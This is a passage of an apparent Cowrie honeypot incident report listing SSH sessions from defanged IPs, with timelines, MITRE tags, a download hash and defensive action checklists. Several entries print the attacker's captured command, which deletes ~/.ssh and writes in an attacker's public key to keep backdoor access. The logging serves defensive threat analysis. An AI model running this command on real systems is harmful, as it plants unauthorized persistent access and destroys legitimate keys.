| `2026-04-24 22:19:00` | `cowrie.client.version` |
| `2026-04-24 22:19:00` | `cowrie.client.kex` |
| `2026-04-24 22:19:01` | `cowrie.login.success` |
| `2026-04-24 22:19:02` | `cowrie.session.params` |
| `2026-04-24 22:19:02` | `cowrie.command.input` |
| `2026-04-24 22:19:02` | `cowrie.command.failed` |
| `2026-04-24 22:19:02` | `cowrie.log.closed` |
| `2026-04-24 22:19:03` | `cowrie.session.params` |
| `2026-04-24 22:19:03` | `cowrie.command.input` |
| `2026-04-24 22:19:03` | `cowrie.session.file_download` |
| `2026-04-24 22:19:03` | `cowrie.log.closed` |
| `2026-04-24 22:19:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.98.230[.]202` to AbuseIPDB if not already reported
- [ ] Block `114.98.230[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd134ded0c04

| Field | Detail |
|---|---|
| **Source IP** | `114.98.230[.]202` |
| **First Seen** | 2026-04-24 22:19 |
| **Last Seen** | 2026-04-24 22:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:19:13` | `cowrie.session.connect` |
| `2026-04-24 22:19:13` | `cowrie.client.version` |
| `2026-04-24 22:19:13` | `cowrie.client.kex` |
| `2026-04-24 22:19:14` | `cowrie.login.success` |
| `2026-04-24 22:19:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.98.230[.]202` to AbuseIPDB if not already reported
- [ ] Block `114.98.230[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0381ac833d6d

| Field | Detail |
|---|---|
| **Source IP** | `114.98.230[.]202` |
| **First Seen** | 2026-04-24 22:22 |
| **Last Seen** | 2026-04-24 22:22 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:22:30` | `cowrie.session.connect` |
| `2026-04-24 22:22:30` | `cowrie.client.version` |
| `2026-04-24 22:22:30` | `cowrie.client.kex` |
| `2026-04-24 22:22:33` | `cowrie.login.success` |
| `2026-04-24 22:22:33` | `cowrie.session.params` |
| `2026-04-24 22:22:33` | `cowrie.command.input` |
| `2026-04-24 22:22:33` | `cowrie.command.failed` |
| `2026-04-24 22:22:34` | `cowrie.log.closed` |
| `2026-04-24 22:22:35` | `cowrie.session.params` |
| `2026-04-24 22:22:35` | `cowrie.command.input` |
| `2026-04-24 22:22:35` | `cowrie.session.file_download` |
| `2026-04-24 22:22:35` | `cowrie.log.closed` |
| `2026-04-24 22:22:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.98.230[.]202` to AbuseIPDB if not already reported
- [ ] Block `114.98.230[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-518da8888e52

| Field | Detail |
|---|---|
| **Source IP** | `114.98.230[.]202` |
| **First Seen** | 2026-04-24 22:22 |
| **Last Seen** | 2026-04-24 22:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:22:39` | `cowrie.session.connect` |
| `2026-04-24 22:22:39` | `cowrie.client.version` |
| `2026-04-24 22:22:39` | `cowrie.client.kex` |
| `2026-04-24 22:22:41` | `cowrie.login.success` |
| `2026-04-24 22:22:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.98.230[.]202` to AbuseIPDB if not already reported
- [ ] Block `114.98.230[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba6c1cdc19d2

| Field | Detail |
|---|---|
| **Source IP** | `114.98.230[.]202` |
| **First Seen** | 2026-04-24 22:27 |
| **Last Seen** | 2026-04-24 22:28 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:27:48` | `cowrie.session.connect` |
| `2026-04-24 22:27:48` | `cowrie.client.version` |
| `2026-04-24 22:27:48` | `cowrie.client.kex` |
| `2026-04-24 22:27:49` | `cowrie.login.success` |
| `2026-04-24 22:27:50` | `cowrie.session.params` |
| `2026-04-24 22:27:50` | `cowrie.command.input` |
| `2026-04-24 22:27:50` | `cowrie.command.failed` |
| `2026-04-24 22:27:52` | `cowrie.log.closed` |
| `2026-04-24 22:27:52` | `cowrie.session.params` |
| `2026-04-24 22:27:52` | `cowrie.command.input` |
| `2026-04-24 22:27:52` | `cowrie.session.file_download` |
| `2026-04-24 22:27:52` | `cowrie.log.closed` |
| `2026-04-24 22:28:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.98.230[.]202` to AbuseIPDB if not already reported
- [ ] Block `114.98.230[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f56728f5f052

| Field | Detail |
|---|---|
| **Source IP** | `114.98.230[.]202` |
| **First Seen** | 2026-04-24 22:27 |
| **Last Seen** | 2026-04-24 22:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:27:56` | `cowrie.session.connect` |
| `2026-04-24 22:27:56` | `cowrie.client.version` |
| `2026-04-24 22:27:56` | `cowrie.client.kex` |
| `2026-04-24 22:28:00` | `cowrie.login.success` |
| `2026-04-24 22:28:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.98.230[.]202` to AbuseIPDB if not already reported
- [ ] Block `114.98.230[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cc5ef211a2e

| Field | Detail |
|---|---|
| **Source IP** | `114.98.230[.]202` |
| **First Seen** | 2026-04-24 22:29 |
| **Last Seen** | 2026-04-24 22:29 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:29:32` | `cowrie.session.connect` |
| `2026-04-24 22:29:32` | `cowrie.client.version` |
| `2026-04-24 22:29:32` | `cowrie.client.kex` |
| `2026-04-24 22:29:34` | `cowrie.login.success` |
| `2026-04-24 22:29:35` | `cowrie.session.params` |
| `2026-04-24 22:29:35` | `cowrie.command.input` |
| `2026-04-24 22:29:35` | `cowrie.command.failed` |
| `2026-04-24 22:29:35` | `cowrie.log.closed` |
| `2026-04-24 22:29:35` | `cowrie.session.params` |
| `2026-04-24 22:29:35` | `cowrie.command.input` |
| `2026-04-24 22:29:35` | `cowrie.session.file_download` |
| `2026-04-24 22:29:35` | `cowrie.log.closed` |
| `2026-04-24 22:29:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.98.230[.]202` to AbuseIPDB if not already reported
- [ ] Block `114.98.230[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03e0a3ef2380

| Field | Detail |
|---|---|
| **Source IP** | `114.98.230[.]202` |
| **First Seen** | 2026-04-24 22:29 |
| **Last Seen** | 2026-04-24 22:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:29:44` | `cowrie.session.connect` |
| `2026-04-24 22:29:44` | `cowrie.client.version` |
| `2026-04-24 22:29:44` | `cowrie.client.kex` |
| `2026-04-24 22:29:46` | `cowrie.login.success` |
| `2026-04-24 22:29:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.98.230[.]202` to AbuseIPDB if not already reported
- [ ] Block `114.98.230[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a08bfeaf1aed

| Field | Detail |
|---|---|
| **Source IP** | `114.98.230[.]202` |
| **First Seen** | 2026-04-24 22:31 |
| **Last Seen** | 2026-04-24 22:31 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:31:17` | `cowrie.session.connect` |
| `2026-04-24 22:31:17` | `cowrie.client.version` |
| `2026-04-24 22:31:21` | `cowrie.client.kex` |
| `2026-04-24 22:31:22` | `cowrie.login.success` |
| `2026-04-24 22:31:23` | `cowrie.session.params` |
| `2026-04-24 22:31:23` | `cowrie.command.input` |
| `2026-04-24 22:31:23` | `cowrie.command.failed` |
| `2026-04-24 22:31:23` | `cowrie.log.closed` |
| `2026-04-24 22:31:24` | `cowrie.session.params` |
| `2026-04-24 22:31:24` | `cowrie.command.input` |
| `2026-04-24 22:31:24` | `cowrie.session.file_download` |
| `2026-04-24 22:31:24` | `cowrie.log.closed` |
| `2026-04-24 22:31:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.98.230[.]202` to AbuseIPDB if not already reported
- [ ] Block `114.98.230[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cd870a9c737

| Field | Detail |
|---|---|
| **Source IP** | `114.98.230[.]202` |
| **First Seen** | 2026-04-24 22:31 |
| **Last Seen** | 2026-04-24 22:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:31:29` | `cowrie.session.connect` |
| `2026-04-24 22:31:29` | `cowrie.client.version` |
| `2026-04-24 22:31:29` | `cowrie.client.kex` |
| `2026-04-24 22:31:31` | `cowrie.login.success` |
| `2026-04-24 22:31:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.98.230[.]202` to AbuseIPDB if not already reported
- [ ] Block `114.98.230[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60b070bf1980

| Field | Detail |
|---|---|
| **Source IP** | `86.238.165[.]111` |
| **First Seen** | 2026-04-24 22:34 |
| **Last Seen** | 2026-04-24 22:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:34:25` | `cowrie.session.connect` |
| `2026-04-24 22:34:25` | `cowrie.client.version` |
| `2026-04-24 22:34:25` | `cowrie.client.kex` |
| `2026-04-24 22:34:26` | `cowrie.login.success` |
| `2026-04-24 22:34:26` | `cowrie.session.params` |
| `2026-04-24 22:34:26` | `cowrie.command.input` |
| `2026-04-24 22:34:26` | `cowrie.command.failed` |
| `2026-04-24 22:34:27` | `cowrie.log.closed` |
| `2026-04-24 22:34:27` | `cowrie.session.params` |
| `2026-04-24 22:34:27` | `cowrie.command.input` |
| `2026-04-24 22:34:27` | `cowrie.session.file_download` |
| `2026-04-24 22:34:27` | `cowrie.log.closed` |
| `2026-04-24 22:34:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.238.165[.]111` to AbuseIPDB if not already reported
- [ ] Block `86.238.165[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8a939ff2f3c

| Field | Detail |
|---|---|
| **Source IP** | `86.238.165[.]111` |
| **First Seen** | 2026-04-24 22:34 |
| **Last Seen** | 2026-04-24 22:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:34:30` | `cowrie.session.connect` |
| `2026-04-24 22:34:30` | `cowrie.client.version` |
| `2026-04-24 22:34:30` | `cowrie.client.kex` |
| `2026-04-24 22:34:31` | `cowrie.login.success` |
| `2026-04-24 22:34:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.238.165[.]111` to AbuseIPDB if not already reported
- [ ] Block `86.238.165[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55e76a14313e

| Field | Detail |
|---|---|
| **Source IP** | `114.98.230[.]202` |
| **First Seen** | 2026-04-24 22:34 |
| **Last Seen** | 2026-04-24 22:35 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:34:52` | `cowrie.session.connect` |
| `2026-04-24 22:34:52` | `cowrie.client.version` |
| `2026-04-24 22:34:53` | `cowrie.client.kex` |
| `2026-04-24 22:34:53` | `cowrie.login.success` |
| `2026-04-24 22:34:54` | `cowrie.session.params` |
| `2026-04-24 22:34:54` | `cowrie.command.input` |
| `2026-04-24 22:34:54` | `cowrie.command.failed` |
| `2026-04-24 22:34:54` | `cowrie.log.closed` |
| `2026-04-24 22:34:55` | `cowrie.session.params` |
| `2026-04-24 22:34:55` | `cowrie.command.input` |
| `2026-04-24 22:34:56` | `cowrie.session.file_download` |
| `2026-04-24 22:34:56` | `cowrie.log.closed` |
| `2026-04-24 22:35:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.98.230[.]202` to AbuseIPDB if not already reported
- [ ] Block `114.98.230[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-753a46ecd369

| Field | Detail |
|---|---|
| **Source IP** | `114.98.230[.]202` |
| **First Seen** | 2026-04-24 22:35 |
| **Last Seen** | 2026-04-24 22:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:35:00` | `cowrie.session.connect` |
| `2026-04-24 22:35:00` | `cowrie.client.version` |
| `2026-04-24 22:35:00` | `cowrie.client.kex` |
| `2026-04-24 22:35:01` | `cowrie.login.success` |
| `2026-04-24 22:35:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.98.230[.]202` to AbuseIPDB if not already reported
- [ ] Block `114.98.230[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3789baf554d

| Field | Detail |
|---|---|
| **Source IP** | `86.238.165[.]111` |
| **First Seen** | 2026-04-24 22:36 |
| **Last Seen** | 2026-04-24 22:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:36:11` | `cowrie.session.connect` |
| `2026-04-24 22:36:11` | `cowrie.client.version` |
| `2026-04-24 22:36:12` | `cowrie.client.kex` |
| `2026-04-24 22:36:12` | `cowrie.login.success` |
| `2026-04-24 22:36:13` | `cowrie.session.params` |
| `2026-04-24 22:36:13` | `cowrie.command.input` |
| `2026-04-24 22:36:13` | `cowrie.command.failed` |
| `2026-04-24 22:36:13` | `cowrie.log.closed` |
| `2026-04-24 22:36:13` | `cowrie.session.params` |
| `2026-04-24 22:36:13` | `cowrie.command.input` |
| `2026-04-24 22:36:13` | `cowrie.session.file_download` |
| `2026-04-24 22:36:13` | `cowrie.log.closed` |
| `2026-04-24 22:36:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.238.165[.]111` to AbuseIPDB if not already reported
- [ ] Block `86.238.165[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-568d70ae79ce

| Field | Detail |
|---|---|
| **Source IP** | `86.238.165[.]111` |
| **First Seen** | 2026-04-24 22:36 |
| **Last Seen** | 2026-04-24 22:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:36:16` | `cowrie.session.connect` |
| `2026-04-24 22:36:16` | `cowrie.client.version` |
| `2026-04-24 22:36:16` | `cowrie.client.kex` |
| `2026-04-24 22:36:17` | `cowrie.login.success` |
| `2026-04-24 22:36:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.238.165[.]111` to AbuseIPDB if not already reported
- [ ] Block `86.238.165[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95b1fd9e5350

| Field | Detail |
|---|---|
| **Source IP** | `211.254.212[.]59` |
| **First Seen** | 2026-04-24 22:37 |
| **Last Seen** | 2026-04-24 22:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:37:57` | `cowrie.session.connect` |
| `2026-04-24 22:37:57` | `cowrie.client.version` |
| `2026-04-24 22:37:57` | `cowrie.client.kex` |
| `2026-04-24 22:37:58` | `cowrie.login.success` |
| `2026-04-24 22:37:58` | `cowrie.session.params` |
| `2026-04-24 22:37:58` | `cowrie.command.input` |
| `2026-04-24 22:37:58` | `cowrie.command.failed` |
| `2026-04-24 22:37:58` | `cowrie.log.closed` |
| `2026-04-24 22:37:58` | `cowrie.session.params` |
| `2026-04-24 22:37:58` | `cowrie.command.input` |
| `2026-04-24 22:37:58` | `cowrie.session.file_download` |
| `2026-04-24 22:37:58` | `cowrie.log.closed` |
| `2026-04-24 22:38:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.254.212[.]59` to AbuseIPDB if not already reported
- [ ] Block `211.254.212[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00eca66e0117

| Field | Detail |
|---|---|
| **Source IP** | `211.254.212[.]59` |
| **First Seen** | 2026-04-24 22:38 |
| **Last Seen** | 2026-04-24 22:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:38:00` | `cowrie.session.connect` |
| `2026-04-24 22:38:00` | `cowrie.client.version` |
| `2026-04-24 22:38:01` | `cowrie.client.kex` |
| `2026-04-24 22:38:01` | `cowrie.login.success` |
